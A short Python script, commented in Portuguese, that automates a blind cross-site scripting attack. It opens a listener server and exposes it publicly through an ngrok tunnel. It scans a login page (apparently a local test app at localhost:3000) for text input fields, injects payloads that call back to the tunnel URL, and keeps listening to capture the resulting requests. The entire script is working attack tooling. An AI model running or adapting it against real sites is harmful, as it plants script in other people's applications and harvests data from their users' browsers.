from src.modules.server_ouvinte import iniciar_servidor_ouvinte
from pyngrok import ngrok
import threading
from src.modules.xss import get_rendered_html, find_tags, blind_xss_injection

# Configuração de Tags para encontrar campos de entrada
TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

# Configurações do servidor ouvinte
porta = 8000

# Inicia o servidor ouvinte em uma thread separada
iniciar_servidor_ouvinte(porta)

# Cria o túnel ngrok para expor o servidor local
ngrok_tunnel = ngrok.connect(porta)
url_ouvinte = ngrok_tunnel.public_url
print(f"[*] Servidor ouvinte exposto em: {url_ouvinte}")

# Exemplo de uso do Blind XSS
driver = get_rendered_html("http://localhost:3000/#/login")
if driver:
    html = driver.page_source
    found_tags = find_tags(html, TAGS_TO_FIND)
    
    # Filtra apenas os campos válidos (exemplo: campos de texto)
    campos_validos = [
        {'element': tag} for tag in found_tags
        if tag.get('type') in ['text', 'search', 'email', 'url']
    ]
    
    # Realiza a injeção de Blind XSS
    injected_payloads = blind_xss_injection(campos_validos, driver, url_ouvinte)
    
    print("\n=== Payloads injetados ===")
    for payload in injected_payloads:
        print(f"Campo: {payload['field_name']} | Payload: {payload['payload']} | Status: {payload['status']}")
    
    driver.quit()

# Mantém o servidor ouvinte ativo por um tempo para capturar requisições
try:
    print("[*] Servidor ouvinte ativo. Pressione Ctrl+C para encerrar.")
    while True:
        pass
except KeyboardInterrupt:
    print("[*] Encerrando servidor ouvinte...")
    ngrok.disconnect(url_ouvinte)


    